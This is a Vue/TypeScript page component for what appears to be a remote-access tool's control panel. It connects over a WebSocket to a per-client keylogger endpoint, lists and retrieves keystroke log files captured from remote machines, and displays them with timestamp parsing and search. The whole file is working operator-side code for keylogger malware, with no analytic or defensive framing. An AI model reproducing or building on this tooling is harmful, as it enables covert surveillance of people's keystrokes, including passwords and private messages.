<script setup lang="ts">
import { ref, computed, onMounted, onUnmounted, nextTick, watch } from "vue";
import { useRoute, useRouter } from "vue-router";
import { decode } from "@msgpack/msgpack";

const route = useRoute();
const router = useRouter();
const clientId = route.params.id as string;

interface KeylogFile {
  filename: string;
  size?: number;
  createdAt?: number;
}

interface LogEntry {
  timestamp: string;
  text: string;
}

const connected = ref(false);
const error = ref("");
const logFiles = ref<KeylogFile[]>([]);
const selectedFile = ref<string | null>(null);
const logContent = ref<LogEntry[]>([]);
const logRaw = ref("");
const contentLoading = ref(false);
const search = ref("");
const contentRef = ref<HTMLDivElement>();
const autoScroll = ref(true);
let ws: WebSocket | null = null;

const wsUrl = () => {
  const proto = location.protocol === "https:" ? "wss" : "ws";
  return `${proto}://${location.host}/api/clients/${clientId}/keylogger/ws`;
};

const filteredEntries = computed(() => {
  if (!search.value) return logContent.value;
  const q = search.value.toLowerCase();
  return logContent.value.filter((e) => e.text.toLowerCase().includes(q) || e.timestamp.toLowerCase().includes(q));
});

function decodeMsg(data: ArrayBuffer | string): any {
  if (typeof data === "string") return JSON.parse(data);
  const bytes = new Uint8Array(data);
  try { return decode(bytes); } catch {}
  try { return JSON.parse(new TextDecoder().decode(bytes)); } catch {}
  return null;
}

function connect() {
  if (ws) ws.close();
  error.value = "";
  try {
    ws = new WebSocket(wsUrl());
    ws.binaryType = "arraybuffer";
    ws.onopen = () => {
      connected.value = true;
      requestFileList();
    };
    ws.onclose = () => { connected.value = false; };
    ws.onerror = () => { error.value = "Connection failed"; connected.value = false; };
    ws.onmessage = (ev) => {
      const data = decodeMsg(ev.data);
      if (!data) return;
      if (data.type === "keylog_file_list" && data.files) {
        logFiles.value = data.files;
      } else if (data.type === "keylog_retrieve_result" && data.content !== undefined) {
        logRaw.value = data.content;
        logContent.value = parseLogEntries(data.content);
        contentLoading.value = false;
        if (autoScroll.value) scrollToBottom();
      } else if (data.type === "command_result" && data.ok === false) {
        error.value = data.message || "Command failed";
        contentLoading.value = false;
      }
    };
  } catch { error.value = "Failed to connect"; }
}

function sendRaw(msg: Record<string, unknown>) {
  if (ws && ws.readyState === WebSocket.OPEN) {
    ws.send(JSON.stringify(msg));
  }
}

function requestFileList() {
  sendRaw({ type: "keylog_list" });
}

function selectFile(filename: string) {
  selectedFile.value = filename;
  logContent.value = [];
  logRaw.value = "";
  contentLoading.value = true;
  sendRaw({ type: "keylog_retrieve", filename });
}

function parseLogEntries(raw: string): LogEntry[] {
  if (!raw) return [];
  const lines = raw.split("\n");
  const entries: LogEntry[] = [];
  const tsPattern = /^\[?(\d{4}[-/]\d{2}[-/]\d{2}[\sT]\d{2}:\d{2}:\d{2}[^\]]*)\]?\s*/;
  for (const line of lines) {
    const match = line.match(tsPattern);
    if (match) {
      entries.push({
        timestamp: match[1].trim(),
        text: line.slice(match[0].length),
      });
    } else {
      if (entries.length > 0) {
        entries[entries.length - 1].text += "\n" + line;
      } else {
        entries.push({ timestamp: "", text: line });
      }
    }
  }
  return entries;
}

function refreshFiles() {
  requestFileList();
}

function clearAll() {
  logContent.value = [];
  logRaw.value = "";
  selectedFile.value = null;
}

function scrollToBottom() {
  nextTick(() => {
    if (contentRef.value) {
      contentRef.value.scrollTop = contentRef.value.scrollHeight;
    }
  });
}

function formatTs(ts: string) {
  if (!ts) return "";
  return ts;
}

function reconnect() { connect(); }

watch(autoScroll, (val) => {
  if (val) scrollToBottom();
});

onMounted(() => {
  connect();
});

onUnmounted(() => { ws?.close(); });
</script>

<template>
  <div class="h-full flex flex-col bg-slate-950">
    <div class="flex items-center gap-3 mb-4 flex-shrink-0">
      <button @click="router.back()" class="text-slate-400 hover:text-slate-200 transition-colors">
        <i class="fa-solid fa-arrow-left"></i>
      </button>
      <h1 class="text-lg font-semibold text-slate-100">Keylogger</h1>
      <div class="ml-auto flex items-center gap-2">
        <button @click="refreshFiles" :disabled="!connected" class="px-2.5 py-1.5 text-xs rounded bg-slate-900 border border-slate-800 text-slate-300 hover:bg-slate-800 disabled:opacity-40 transition-colors">
          <i class="fa-solid fa-rotate-right mr-1"></i>Refresh
        </button>
        <button @click="reconnect" class="px-2.5 py-1.5 text-xs rounded bg-slate-900 border border-slate-800 text-slate-300 hover:bg-slate-800 transition-colors">
          <i class="fa-solid fa-link mr-1"></i>Connect
        </button>
        <span :class="['w-2 h-2 rounded-full', connected ? 'bg-green-500' : 'bg-red-500']"></span>
      </div>
    </div>

    <p v-if="error" class="text-sm text-red-400 mb-2">{{ error }}</p>

    <div class="flex-1 flex gap-3 min-h-0">
      <aside class="w-56 flex-shrink-0 bg-slate-900 border border-slate-800 rounded-lg overflow-auto">
        <div class="px-3 py-2 border-b border-slate-800">
          <span class="text-xs text-slate-400 font-medium">Log Files</span>
          <span class="text-xs text-slate-600 ml-1">({{ logFiles.length }})</span>
        </div>
        <div v-if="logFiles.length === 0" class="px-3 py-6 text-center text-slate-500 text-xs">
          <i class="fa-solid fa-folder-open mr-1"></i>No files
        </div>
        <button
          v-for="file in logFiles"
          :key="file.filename"
          @click="selectFile(file.filename)"
          :class="[
            'w-full text-left px-3 py-2 text-xs hover:bg-slate-800 transition-colors border-b border-slate-800/50',
            selectedFile === file.filename
              ? 'text-blue-400 bg-blue-900/20'
              : 'text-slate-300',
          ]"
        >
          <i class="fa-solid fa-file-lines mr-2 text-slate-500"></i>
          <span class="truncate">{{ file.filename }}</span>
        </button>
      </aside>

      <div class="flex-1 flex flex-col min-h-0">
        <div class="flex items-center gap-2 mb-2 flex-shrink-0">
          <input
            v-model="search"
            type="text"
            placeholder="Search in log content..."
            class="flex-1 px-3 py-1.5 bg-slate-900 border border-slate-800 rounded text-xs text-slate-200 placeholder:text-slate-500 focus:outline-none focus:border-slate-700"
          />
          <button
            @click="autoScroll = !autoScroll"
            :class="[
              'px-2.5 py-1.5 text-xs rounded border transition-colors',
              autoScroll
                ? 'bg-blue-900/30 border-blue-800 text-blue-400 hover:bg-blue-900/50'
                : 'bg-slate-900 border-slate-800 text-slate-400 hover:bg-slate-800',
            ]"
            title="Auto-scroll"
          >
            <i class="fa-solid fa-arrow-down mr-1"></i>Scroll
          </button>
          <button @click="clearAll" class="px-2.5 py-1.5 text-xs rounded bg-slate-900 border border-slate-800 text-slate-400 hover:bg-slate-800 transition-colors" title="Clear view">
            <i class="fa-solid fa-trash mr-1"></i>Clear
          </button>
        </div>

        <div
          ref="contentRef"
          class="flex-1 overflow-auto bg-slate-900 border border-slate-800 rounded-lg p-3"
        >
          <div v-if="!selectedFile && logContent.length === 0" class="flex items-center justify-center h-full text-slate-500 text-sm">
            <div class="text-center">
              <i class="fa-solid fa-keyboard text-2xl mb-2 block"></i>
              <p>Select a log file to view keystrokes</p>
            </div>
          </div>

          <div v-else-if="contentLoading" class="flex items-center justify-center h-full text-slate-500 text-sm">
            <i class="fa-solid fa-spinner fa-spin mr-2"></i>Loading...
          </div>

          <div v-else-if="filteredEntries.length === 0 && !contentLoading" class="flex items-center justify-center h-full text-slate-500 text-sm">
            <div class="text-center">
              <i class="fa-solid fa-magnifying-glass text-2xl mb-2 block"></i>
              <p>{{ search ? "No matching entries" : "No keystroke data" }}</p>
            </div>
          </div>

          <div v-else class="space-y-0.5">
            <div
              v-for="(entry, i) in filteredEntries"
              :key="i"
              class="flex gap-2 py-1 border-b border-slate-800/30"
            >
              <span
                v-if="entry.timestamp"
                class="text-xs text-slate-500 font-mono whitespace-nowrap flex-shrink-0 select-none pt-0.5"
              >{{ formatTs(entry.timestamp) }}</span>
              <span
                v-else
                class="w-0 flex-shrink-0"
              ></span>
              <pre class="text-xs text-slate-200 font-mono whitespace-pre-wrap break-all leading-relaxed">{{ entry.text }}</pre>
            </div>
          </div>
        </div>

        <div v-if="selectedFile" class="flex items-center justify-between mt-2 px-1 flex-shrink-0">
          <span class="text-xs text-slate-500 truncate max-w-xs" :title="selectedFile">{{ selectedFile }}</span>
          <span class="text-xs text-slate-500">{{ filteredEntries.length }} entries</span>
        </div>
      </div>
    </div>
  </div>
</template>
